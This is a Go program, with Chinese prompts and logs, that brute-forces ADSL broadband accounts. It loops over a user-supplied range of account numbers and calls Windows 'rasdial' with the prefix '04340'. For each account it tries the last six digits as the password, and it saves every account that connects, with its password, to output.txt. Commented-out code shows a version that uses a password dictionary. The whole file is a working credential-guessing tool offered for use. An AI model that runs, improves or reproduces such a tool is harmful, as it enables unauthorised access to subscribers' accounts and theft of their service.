package main

import (
	"fmt"
	"presbyter/adsl/cmd"
	"log"
	"presbyter/adsl/file"
	"strconv"
)

func main() {
	fmt.Print("请输入起始号码(例如6210000):")
	var beginStr string
	fmt.Scanln(&beginStr)
	fmt.Print("请输入终止号码(例如6299999):")
	var endStr string
	fmt.Scanln(&endStr)

	// 读取密码字典
	//passArr, err := file.ReadLn("passwd.txt")
	//if err != nil {
	//	log.Println("读取字典失败")
	//	panic(err)
	//}

	// 循环账号
	beginNum, err := strconv.ParseInt(beginStr, 10, 32)
	if err != nil {
		log.Println("起始号码输入有误!起始号码不可以为字母.")
		panic(err)
	}
	endNum, err := strconv.ParseInt(endStr, 10, 32)
	if err != nil {
		log.Println("终止号码输入有误!终止号码不可以为字母.")
		panic(err)
	}

	if endNum < beginNum {
		log.Println("终止号码不可以小于起始号码.")
		return
	}

	for i := beginNum; i < endNum; i++ {
		//for _, pass := range passArr {
		//	//log.Print(strconv.FormatInt(i, 10), "\t", pass)
		//	err := connAdsl(strconv.FormatInt(i, 10), pass)
		//	if err == nil {
		//		disconnAdsl()
		//		file.WriteFile("output.txt", fmt.Sprint("04340", i, "\t", pass, "\n"))
		//	}
		//}
		// 账号后六位为密码
		pass := strconv.FormatInt(i, 10)[1:]
		err := connAdsl(strconv.FormatInt(i, 10), pass)
		if err == nil {
			disconnAdsl()
			file.WriteFile("output.txt", fmt.Sprint("04340", i, "\t", pass, "\n"))
		}
	}
}

func connAdsl(account string, password string) error {
	commandStr := fmt.Sprintf("rasdial %s 04340%s %s", "宽带连接", account, password)
	if err := cmd.ExecCmd(commandStr); err != nil {
		log.Printf("账号:04340%s 密码:%s 连接失败.\n", account, password)
		return err
	}
	log.Printf("账号:04340%s 密码:%s 连接成功.\n", account, password)
	return nil
}

func disconnAdsl() error {
	commandStr := fmt.Sprintf("rasdial %s /disconnect", "宽带连接")
	if err := cmd.ExecCmd(commandStr); err != nil {
		log.Println("断开连接失败.")
		return err
	}
	log.Println("已断开连接.")
	return nil
}
